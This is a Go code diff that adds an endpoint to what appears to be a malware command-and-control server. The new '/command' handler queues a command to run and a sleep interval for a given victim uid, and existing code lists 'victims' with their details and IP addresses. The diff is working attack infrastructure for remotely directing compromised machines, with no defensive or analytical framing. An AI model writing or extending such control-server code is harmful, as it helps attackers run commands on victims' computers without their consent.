@@ -60,6 +60,20 @@ func queryCommand(x []byte) string {
   return "Query db for command"
 }
 
+func addCommand(w http.ResponseWriter, r *http.Request){
+  // POST: uid, run, sleep
+  uid := r.FormValue("uid")
+  run := r.FormValue("run")
+  sleep := r.FormValue("sleep")
+  // Create
+  // uid==command==time of response
+  add, err := db.Prepare("INSERT INTO command (uid, run, sleep) VALUES(?, ?, ?)")
+  errorStatment(err)
+  add.Exec(uid, run, sleep)
+  w.WriteHeader(http.StatusCreated)
+  fmt.Printf("----\ncommand: %s\nuid: %s\nsleep: %s", run, uid, sleep)
+}
+
 func pageAPI(w http.ResponseWriter, r *http.Request) {
   rows, err := db.Query("SELECT uid, details, ip from victims ORDER BY uid DESC");
   errorStatment(err)
@@ -110,5 +124,6 @@ func main() {
 
   http.HandleFunc("/", proccessData)
 	http.HandleFunc("/victim", pageAPI)
+  http.HandleFunc("/command", addCommand)
 	log.Fatal(http.ListenAndServe(":8080", nil))
 }
